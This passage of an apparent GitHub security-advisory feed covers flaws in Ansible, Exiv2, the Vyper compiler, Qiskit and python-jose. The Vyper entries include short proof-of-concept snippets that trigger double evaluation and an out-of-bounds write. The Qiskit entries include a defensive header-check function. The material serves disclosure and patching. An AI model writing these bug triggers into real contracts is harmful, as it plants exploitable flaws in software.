<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2312119">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:8969">https://access.redhat.com/errata/RHSA-2024:8969</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:9894">https://access.redhat.com/errata/RHSA-2024:9894</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:10762">https://access.redhat.com/errata/RHSA-2024:10762</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1249">https://access.redhat.com/errata/RHSA-2025:1249</a></li>
<li><a href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>
<li><a href="https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-16T14:37:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-core] Ansible vulnerable to Insertion of Sensitive Information into Log File]]></title>
        <id>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</id>
        <link href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj"/>
        <updated>2025-02-24T15:15:39.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in Ansible, where sensitive information stored in Ansible Vault files can be exposed in plaintext during the execution of a playbook. This occurs when using tasks such as include_vars to load vaulted variables without setting the no_log: true parameter, resulting in sensitive data being printed in the playbook output or logs. This can lead to the unintentional disclosure of secrets like passwords or API keys, compromising security and potentially allowing unauthorized access or actions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8775">https://nvd.nist.gov/vuln/detail/CVE-2024-8775</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-8775">https://access.redhat.com/security/cve/CVE-2024-8775</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2312119">https://bugzilla.redhat.com/show_bug.cgi?id=2312119</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:8969">https://access.redhat.com/errata/RHSA-2024:8969</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:9894">https://access.redhat.com/errata/RHSA-2024:9894</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:10762">https://access.redhat.com/errata/RHSA-2024:10762</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2025:1249">https://access.redhat.com/errata/RHSA-2025:1249</a></li>
<li><a href="https://github.com/advisories/GHSA-jpxc-vmjf-9fcj">https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</a></li>
<li><a href="https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035">https://github.com/ansible/ansible/commit/8a87e1c5d37422bc99d27ad4237d185cc233e035</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.16.13/changelogs/CHANGELOG-v2.16.rst#security-fixes</a></li>
<li><a href="https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes">https://github.com/ansible/ansible/blob/v2.17.6/changelogs/CHANGELOG-v2.17.rst#security-fixes</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jpxc-vmjf-9fcj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-09-16T14:37:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Exiv2] Exiv2 allows Use After Free]]></title>
        <id>https://github.com/advisories/GHSA-38h4-fx85-qcx7</id>
        <link href="https://github.com/advisories/GHSA-38h4-fx85-qcx7"/>
        <updated>2025-02-21T23:53:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A heap buffer overflow was found in Exiv2 versions v0.28.0 to v0.28.4. Versions prior to v0.28.0, such as v0.27.7, are <strong>not</strong> affected. Exiv2 is a command-line utility and C++ library for reading, writing, deleting, and modifying the metadata of image files. The heap overflow is triggered when Exiv2 is used to write metadata into a crafted image file. An attacker could potentially exploit the vulnerability to gain code execution, if they can trick the victim into running Exiv2 on a crafted image file.</p>
<p>Note that this bug is only triggered when writing the metadata, which is a less frequently used Exiv2 operation than reading the metadata. For example, to trigger the bug in the Exiv2 command-line application, you need to add an extra command-line argument such as <code>fixiso</code>.</p>
<h3 id="patches">Patches</h3>
<p>The bug is fixed in version v0.28.5.</p>
<h3 id="references">References</h3>
<p>Issue: <a href="https://github.com/Exiv2/exiv2/issues/3168">https://github.com/Exiv2/exiv2/issues/3168</a>
Fix: <a href="https://github.com/Exiv2/exiv2/pull/3174">https://github.com/Exiv2/exiv2/pull/3174</a></p>
<h3 id="for-more-information">For more information</h3>
<p>Please see our <a href="https://github.com/Exiv2/exiv2/security/policy">security policy</a> for information about Exiv2 security.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7">https://github.com/Exiv2/exiv2/security/advisories/GHSA-38h4-fx85-qcx7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26623">https://nvd.nist.gov/vuln/detail/CVE-2025-26623</a></li>
<li><a href="https://github.com/Exiv2/exiv2/issues/3168">https://github.com/Exiv2/exiv2/issues/3168</a></li>
<li><a href="https://github.com/Exiv2/exiv2/pull/3174">https://github.com/Exiv2/exiv2/pull/3174</a></li>
<li><a href="https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4">https://github.com/jim-easterbrook/python-exiv2/commit/4cc875e392f9e0bc705fe03d929b9a382b78dae4</a></li>
<li><a href="https://github.com/advisories/GHSA-38h4-fx85-qcx7">https://github.com/advisories/GHSA-38h4-fx85-qcx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-38h4-fx85-qcx7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-21T23:53:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper has a double eval in For List Iter]]></title>
        <id>https://github.com/advisories/GHSA-h33q-mhmp-8p67</id>
        <link href="https://github.com/advisories/GHSA-h33q-mhmp-8p67"/>
        <updated>2025-02-24T20:26:23.000Z</updated>
        <content type="html"><![CDATA[<p>Multiple evaluation of a single expression is possible in the iterator target of a for loop. While the iterator expression cannot produce multiple writes, it can consume side effects produced in the loop body (e.g. read a storage variable updated in the loop body) and thus lead to unexpected program behavior. Specifically, reads in iterators which contain an ifexp (e.g. <code>for s: uint256 in ([read(), read()] if True else [])</code>) may interleave reads with writes in the loop body.</p>
<p>The fix is tracked in <a href="https://github.com/vyperlang/vyper/pull/4488">https://github.com/vyperlang/vyper/pull/4488</a>.</p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>Vyper for loops allow two kinds of iterator targets, namely the <code>range()</code> builtin and an iterable type, like SArray and DArray. </p>
<p>During codegen, iterable lists are required to not produce any side-effects (in the following code, <code>range_scope</code> forces <code>iter_list</code> to be parsed in a constant context, which is checked against <code>is_constant</code>).</p>
<pre><code class="language-python">def _parse_For_list(self):
    with self.context.range_scope():
        iter_list = Expr(self.stmt.iter, self.context).ir_node
    ...

def range_scope(self):
    prev_value = self.in_range_expr
    self.in_range_expr = True
    yield
    self.in_range_expr = prev_value

def is_constant(self):
    return self.constancy is Constancy.Constant or self.in_range_expr
</code></pre>
<p>However, this does not prevent the iterator from consuming side effects provided by the body of the loop. For dynamic arrays, the compiler simply panics:</p>
<pre><code class="language-vyper">x: DynArray[uint256, 3]

@external
def test():
    for i: uint256 in (self.usesideeffect() if True else self.usesideeffect()):
        pass

@view
def usesideeffect() -&gt; DynArray[uint256, 3]:
    return self.x
</code></pre>
<p>For SArrays on the other hand, <code>iter_list</code> is instantiated in the body of a <code>repeat</code> ir, so it can be evaluated several times.</p>
<p>Here are three illustrating examples. In the first example, the following test case pre-evaluates the iter list and stores the result to a temporary list in memory. So the list is only evaluated once, before entry into the loop body, and the log output will be 0, 0, 0.</p>
<pre><code class="language-vyper">event I:
    i: uint256

x: uint256

@deploy
def __init__():
    self.x = 0

@external
def test():
    for i: uint256 in [self.usesideeffect(), self.usesideeffect(), self.usesideeffect()]:
        self.x += 1
        log I(i)

@view
def usesideeffect() -&gt; uint256:
    return self.x
</code></pre>
<p>However, in the next two examples, because the iterator target is not a list literal, it will be evaluated in the loop body. In the second example, <code>iter_list</code> is an ifexp, thus it will be evaluated lazily in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>
<pre><code class="language-vyper">event I:
    i: uint256

x: uint256

@deploy
def __init__():
    self.x = 0

@external
def test():
    for i: uint256 in ([self.usesideeffect(), self.usesideeffect(), self.usesideeffect()] if True else self.otherclause()):
        self.x += 1
        log I(i)

@view
def usesideeffect() -&gt; uint256:
    return self.x

@view
def otherclause() -&gt; uint256[3]:
    return [0, 0, 0]
</code></pre>
<p>In the third example, <code>iter_list</code> is also an ifexp, thus it will only be evaluated in the loop body. The log output will be 0, 1, 2 due to consumption of side effects.</p>
<pre><code class="language-vyper">event I:
    i: uint256

x: uint256[3]

@deploy
def __init__():
    self.x = [0, 0, 0]

@external
def test():
    for i: uint256 in (self.usesideeffect() if True else self.otherclause()):
        self.x[0] += 1
        self.x[1] += 1
        self.x[2] += 1
        log I(i)

@view
def usesideeffect() -&gt; uint256[3]:
    return self.x

@view
def otherclause() -&gt; uint256[3]:
    return [0, 0, 0]
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67">https://github.com/vyperlang/vyper/security/advisories/GHSA-h33q-mhmp-8p67</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4488">https://github.com/vyperlang/vyper/pull/4488</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27104">https://nvd.nist.gov/vuln/detail/CVE-2025-27104</a></li>
<li><a href="https://github.com/advisories/GHSA-h33q-mhmp-8p67">https://github.com/advisories/GHSA-h33q-mhmp-8p67</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h33q-mhmp-8p67</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-21T22:43:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] AugAssign evaluation order causing OOB write within the object in Vyper]]></title>
        <id>https://github.com/advisories/GHSA-4w26-8p97-f4jp</id>
        <link href="https://github.com/advisories/GHSA-4w26-8p97-f4jp"/>
        <updated>2025-02-24T20:25:11.000Z</updated>
        <content type="html"><![CDATA[<p>Vyper handles AugAssign statements by first caching the target location to avoid double evaluation. However, in the case when target is an access to a DynArray and the rhs modifies the array, the cached target will evaluate first, and the bounds check will not be re-evaluated during the write portion of the statement. In other words, the following code</p>
<pre><code class="language-vyper">def poc():
    a: DynArray[uint256, 2] = [1, 2]
    a[1] += a.pop()
</code></pre>
<p>is equivalent to:</p>
<pre><code class="language-vyper">def poc():
    a: DynArray[uint256, 2] = [1, 2]
    a[1] += a[len(a) - 1]
    a.pop()
</code></pre>
<p>rather than:</p>
<pre><code class="language-vyper">def poc():
    a: DynArray[uint256, 2] = [1, 2]
    s: uint256 = a[1]
    t: uint256 = a.pop()
    a[1] = s + t  # reverts due to oob access
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp">https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27105">https://nvd.nist.gov/vuln/detail/CVE-2025-27105</a></li>
<li><a href="https://github.com/advisories/GHSA-4w26-8p97-f4jp">https://github.com/advisories/GHSA-4w26-8p97-f4jp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4w26-8p97-f4jp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-21T22:43:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] Vyper's sqrt doesn't define rounding behavior]]></title>
        <id>https://github.com/advisories/GHSA-2p94-8669-xg86</id>
        <link href="https://github.com/advisories/GHSA-2p94-8669-xg86"/>
        <updated>2025-02-24T20:23:52.000Z</updated>
        <content type="html"><![CDATA[<p>Vyper's <code>sqrt()</code> builtin uses the babylonian method to calculate square roots of decimals. Unfortunately, improper handling of the oscillating final states may lead to sqrt incorrectly returning rounded up results.</p>
<p>the fix is tracked in <a href="https://github.com/vyperlang/vyper/pull/4486">https://github.com/vyperlang/vyper/pull/4486</a></p>
<h3 id="vulnerability-details">Vulnerability Details</h3>
<p>Vyper injects the following code to handle calculation of decimal sqrt. x is the input provided by user.</p>
<pre><code class="language-python">assert x &gt;= 0.0
z: decimal = 0.0

if x == 0.0:
    z = 0.0
else:
    z = x / 2.0 + 0.5
    y: decimal = x

    for i: uint256 in range(256):
        if z == y:
            break
        y = z
        z = (x / z + z) / 2.0
</code></pre>
<p>Notably, the terminal condition of the algorithm is either <code>z_cur == z_prev</code>, or the algorithm runs for 256 rounds.</p>
<p>However, for certain inputs, <code>z</code> might actually oscillate between <code>N</code> and <code>N + epsilon</code>, where <code>N ** 2 &lt;= x &lt; (N + epsilon) ** 2</code>. This means that the current behavior does not define whether it will round up or down to the nearest epsilon.</p>
<p>The example snippet here returns 0.9999999999, the rounded up result for sqrt(0.9999999998). This is due to the oscillation ending in N + epsilon instead of N.</p>
<pre><code class="language-vyper">@external
def test():
    d: decimal = 0.9999999998
    r: decimal = sqrt(d)    #this will be 0.9999999999
</code></pre>
<p>Note that <code>sqrt()</code> diverges from <code>isqrt()</code> here -- <code>isqrt()</code> consistently rounds down, so it is not subject to the same issue.</p>
<h3 id="impact-details">Impact Details</h3>
<p>Since <code>sqrt()</code> can be used for determining boundary conditions, rounding down is preferred. However, since <code>sqrt()</code> is used very rarely in the wild, this advisory has been assigned an impact of <code>low</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86">https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/4486">https://github.com/vyperlang/vyper/pull/4486</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-26622">https://nvd.nist.gov/vuln/detail/CVE-2025-26622</a></li>
<li><a href="https://github.com/advisories/GHSA-2p94-8669-xg86">https://github.com/advisories/GHSA-2p94-8669-xg86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2p94-8669-xg86</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-21T22:43:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit-terra] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit]]></title>
        <id>https://github.com/advisories/GHSA-fpmr-m242-xm7x</id>
        <link href="https://github.com/advisories/GHSA-fpmr-m242-xm7x"/>
        <updated>2025-02-21T21:42:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>
<h3 id="patches">Patches</h3>
<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>
<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>
<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>
<pre><code class="language-python">import struct
from collections import namedtuple


def check_qpy_payload(path: str) -&gt; bool:
    """Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.

    Args:
        path: The path to the QPY file

    Returns:
        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for
        being vulnerable exist, however the payload may not be vulnerable it can't be detected
        until trying to deserialize.
    """
    with open(path, "rb") as file_obj:
        version = struct.unpack("!6sB", file_obj.read(7))[1]
        if version &lt; 10 or version &gt;= 13:
            return False
        file_obj.seek(0)
        header_tuple = namedtuple(
            "FILE_HEADER",
            [
                "preface",
                "qpy_version",
                "major_version",
                "minor_version",
                "patch_version",
                "num_programs",
                "symbolic_encoding",
            ],
        )
        header_pack_str = "!6sBBBBQc"
        header_read_size = struct.calcsize(header_pack_str)
        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))
        header = header_tuple(*data)
        return header.symbolic_encoding == b"e"
</code></pre>
<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>
<h3 id="references">References</h3>
<p>[1] <a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1403">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>
<li><a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>
<li><a href="https://www.ibm.com/support/pages/node/7183868">https://www.ibm.com/support/pages/node/7183868</a></li>
<li><a href="https://github.com/advisories/GHSA-fpmr-m242-xm7x">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpmr-m242-xm7x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-21T21:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qiskit] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit]]></title>
        <id>https://github.com/advisories/GHSA-fpmr-m242-xm7x</id>
        <link href="https://github.com/advisories/GHSA-fpmr-m242-xm7x"/>
        <updated>2025-02-21T21:42:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>
<h3 id="patches">Patches</h3>
<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>
<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>
<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>
<h3 id="workarounds">Workarounds</h3>
<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>
<pre><code class="language-python">import struct
from collections import namedtuple


def check_qpy_payload(path: str) -&gt; bool:
    """Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.

    Args:
        path: The path to the QPY file

    Returns:
        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for
        being vulnerable exist, however the payload may not be vulnerable it can't be detected
        until trying to deserialize.
    """
    with open(path, "rb") as file_obj:
        version = struct.unpack("!6sB", file_obj.read(7))[1]
        if version &lt; 10 or version &gt;= 13:
            return False
        file_obj.seek(0)
        header_tuple = namedtuple(
            "FILE_HEADER",
            [
                "preface",
                "qpy_version",
                "major_version",
                "minor_version",
                "patch_version",
                "num_programs",
                "symbolic_encoding",
            ],
        )
        header_pack_str = "!6sBBBBQc"
        header_read_size = struct.calcsize(header_pack_str)
        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))
        header = header_tuple(*data)
        return header.symbolic_encoding == b"e"
</code></pre>
<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>
<h3 id="references">References</h3>
<p>[1] <a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1403">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>
<li><a href="https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>
<li><a href="https://www.ibm.com/support/pages/node/7183868">https://www.ibm.com/support/pages/node/7183868</a></li>
<li><a href="https://github.com/advisories/GHSA-fpmr-m242-xm7x">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fpmr-m242-xm7x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-21T21:42:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-jose] python-jose algorithm confusion with OpenSSH ECDSA keys]]></title>
        <id>https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</id>
        <link href="https://github.com/advisories/GHSA-6c5p-j8vq-pqhj"/>
        <updated>2025-02-18T22:48:16.000Z</updated>
        <content type="html"><![CDATA[<p>python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-33663">https://nvd.nist.gov/vuln/detail/CVE-2024-33663</a></li>
<li><a href="https://github.com/mpdavis/python-jose/issues/346">https://github.com/mpdavis/python-jose/issues/346</a></li>
<li><a href="https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663">https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-6c5p-j8vq-pqhj">https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-04-26T00:30:35.000Z</published>
    </entry>
</feed>